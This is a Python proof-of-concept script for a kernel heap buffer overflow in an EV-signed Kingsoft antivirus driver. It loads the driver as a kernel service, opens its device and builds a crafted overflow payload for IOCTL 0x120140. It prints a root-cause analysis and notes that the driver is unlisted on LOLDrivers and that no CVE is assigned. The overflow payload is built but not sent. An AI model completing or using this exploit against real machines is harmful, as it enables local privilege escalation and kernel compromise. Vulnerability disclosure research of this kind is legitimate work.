import ctypes
import ctypes.wintypes as wt
import struct
import sys
import os
import subprocess
import time

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

CreateFileW = kernel32.CreateFileW
CreateFileW.restype = wt.HANDLE
DeviceIoControl = kernel32.DeviceIoControl
CloseHandle = kernel32.CloseHandle

DRV = os.path.join(os.path.dirname(os.path.abspath(__file__)), "kdhacker64_ev.sys")
DEVICE_NAME = r"\\.\KDHacker"
SERVICE_NAME = "KDHacker"

IOCTL_GET_VERSION       = 0x120000
IOCTL_VULN_PROCESS_RULES = 0x120140

def ioctl(h, code, inbuf, outsize):
    if inbuf:
        ib = ctypes.create_string_buffer(bytes(inbuf), len(inbuf))
        ib_ptr = ctypes.byref(ib)
        ib_len = len(inbuf)
    else:
        ib_ptr = None
        ib_len = 0
    ob = ctypes.create_string_buffer(max(outsize, 4))
    ret = wt.DWORD(0)
    ok = DeviceIoControl(h, code, ib_ptr, ib_len, ob, outsize, ctypes.byref(ret), None)
    if ok:
        return ob.raw[:ret.value]
    return None

def load_driver():
    if not os.path.exists(DRV):
        print(f"  [-] Driver not found: {DRV}")
        return False
    subprocess.run(["sc", "stop", SERVICE_NAME], capture_output=True, creationflags=0x08000000)
    subprocess.run(["sc", "delete", SERVICE_NAME], capture_output=True, creationflags=0x08000000)
    time.sleep(0.3)
    r = subprocess.run(
        ["sc", "create", SERVICE_NAME, "type=", "kernel", "binpath=", os.path.abspath(DRV)],
        capture_output=True, text=True, creationflags=0x08000000
    )
    if r.returncode != 0 and "exists" not in r.stderr.lower():
        print(f"  [-] sc create failed: {r.stderr}")
        return False
    r = subprocess.run(
        ["sc", "start", SERVICE_NAME],
        capture_output=True, text=True, creationflags=0x08000000
    )
    return r.returncode == 0 or "running" in r.stderr.lower()

def unload_driver():
    subprocess.run(["sc", "stop", SERVICE_NAME], capture_output=True, creationflags=0x08000000)
    subprocess.run(["sc", "delete", SERVICE_NAME], capture_output=True, creationflags=0x08000000)

def open_device():
    h = CreateFileW(
        DEVICE_NAME,
        0xC0000000,
        0,
        None,
        3,
        0x80,
        None
    )
    if h == -1 or h == 0xFFFFFFFFFFFFFFFF:
        return None
    return h

def test_version_ioctl(h):
    result = ioctl(h, IOCTL_GET_VERSION, None, 0x20)
    if result and len(result) >= 0xe:
        ver_major = struct.unpack('<H', result[0:2])[0]
        ver_minor = struct.unpack('<H', result[2:4])[0]
        flag1 = result[4]
        flag2 = result[5]
        return True, f"v{ver_major}.{ver_minor} flags={flag1:02x}{flag2:02x}"
    return False, "Failed or no response"

def build_safe_payload(count=1):
    elements = []
    for i in range(count):
        elem = bytearray(0x488)
        struct.pack_into('<I', elem, 0x000, i)
        struct.pack_into('<I', elem, 0x004, 0x41414141)
        safe_str1 = "SafeStr1\x00".encode('utf-16-le')
        elem[0x008:0x008+len(safe_str1)] = safe_str1
        safe_str2 = "SafeString2\x00".encode('utf-16-le')
        elem[0x088:0x088+len(safe_str2)] = safe_str2
        elements.append(bytes(elem))
    payload = struct.pack('<I', count) + b''.join(elements)
    return payload

def build_overflow_payload(count=1):
    elements = []
    for i in range(count):
        elem = bytearray(0x488)
        struct.pack_into('<I', elem, 0x000, i)
        struct.pack_into('<I', elem, 0x004, 0xDEADBEEF)
        for j in range(0x40):
            struct.pack_into('<H', elem, 0x008 + j*2, 0x0041)
        for j in range(0x1FF):
            struct.pack_into('<H', elem, 0x088 + j*2, 0x0042)
        struct.pack_into('<H', elem, 0x088 + 0x1FF*2, 0x0000)
        elements.append(bytes(elem))
    payload = struct.pack('<I', count) + b''.join(elements)
    return payload

def analyze_overflow():
    print("\n  VULNERABILITY ANALYSIS")
    print("  " + "=" * 54)
    print()
    print("  IOCTL 0x120140 - ProcessRules")
    print("  -----------------------------")
    print("  1. Validation:  count * 0x488 == input_size - 4  [PASSES]")
    print("  2. Allocation:  count * 0x248 bytes              [UNDERSIZED!]")
    print("  3. Processing:  For each element:")
    print("       a) RtlInitUnicodeString(input + 0x008)  // no bounds check")
    print("       b) RtlUnicodeStringToAnsiString()")
    print("       c) memcpy(output + 0x008, ansi, len)    // overflow")
    print()
    print("  Size mismatch:")
    print("    Input string1:  0x80 bytes (128)")
    print("    Output string1: 0x40 bytes (64)")
    print("    Without null terminator, scan continues into string2.")
    print("    Result: 0x80 + 0x400 = 0x480 bytes -> ~576 ANSI chars")
    print("    576 chars written to 64-byte buffer = 512 byte overflow")
    print()
    print("  Exploitation:")
    print("    - Overflow corrupts adjacent kernel pool allocations")
    print("    - Controlled data via string content")
    print("    - Leads to: arbitrary read/write or code execution")
    print()

def main():
    print()
    print("  kdhacker64_ev.sys -- Kernel Heap Overflow PoC")
    print("  Kingsoft AntiVirus Driver | EV Signed")
    print("  " + "=" * 54)
    print()
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    if not is_admin:
        print("  [!] Warning: Not running as Administrator")
        print("  [!] Driver load/unload will fail without elevation")
        print()
    h = open_device()
    driver_loaded = False
    if h is None:
        print("  [*] Device not found, attempting to load driver...")
        if os.path.exists(DRV):
            if load_driver():
                time.sleep(0.5)
                h = open_device()
                driver_loaded = True
            else:
                print("  [-] Failed to load driver (need admin privileges)")
        else:
            print(f"  [-] Driver file not found: {DRV}")
            print("  [*] Continuing with analysis only...")
    if h:
        print(f"  [+] Device opened: {DEVICE_NAME}")
        success, info = test_version_ioctl(h)
        if success:
            print(f"  [+] GET_VERSION   {info}")
        else:
            print(f"  [-] GET_VERSION   {info}")
        safe_payload = build_safe_payload(1)
        print(f"  [*] Safe payload built: {len(safe_payload)} bytes")
        print(f"      Count: 1, Element size: 0x488, Total: 0x48C")
        print()
        print("  [!] OVERFLOW PAYLOAD (NOT SENDING - would crash kernel)")
        vuln_payload = build_overflow_payload(1)
        print(f"      Payload size: {len(vuln_payload)} bytes")
        print(f"      String1 at +0x008: 64 'A' wchars, NO null terminator")
        print(f"      String2 at +0x088: 511 'B' wchars + null")
        print(f"      Expected ANSI length: ~575 chars")
        print(f"      Destination buffer: 64 bytes")
        print(f"      Overflow amount: ~511 bytes into kernel heap")
        CloseHandle(h)
        print()
        print("  [+] Device handle closed")
    else:
        print("  [-] Could not open device (analysis only mode)")
    analyze_overflow()
    print("  FINDINGS SUMMARY")
    print("  " + "=" * 54)
    print("  Driver:     kdhacker64_ev.sys (Kingsoft AntiVirus)")
    print("  Device:     \\Device\\KDHacker -> \\\\.\\KDHacker")
    print("  Vuln IOCTL: 0x120140 (ProcessRules)")
    print("  Type:       Kernel Heap Buffer Overflow")
    print("  Root Cause: RtlInitUnicodeString unbounded scan")
    print("  Impact:     Local Privilege Escalation")
    print("  CVSS:       7.8 (High)")
    print("  " + "-" * 54)
    print("  Signed:     Kingsoft (EV certificate)")
    print("  LOLDrivers: Not yet listed")
    print("  CVE:        None assigned")
    print("  " + "=" * 54)
    if driver_loaded:
        print()
        print("  [*] Unloading driver...")
        unload_driver()
        print("  [+] Driver unloaded")
    return 0

if __name__ == "__main__":
    sys.exit(main())
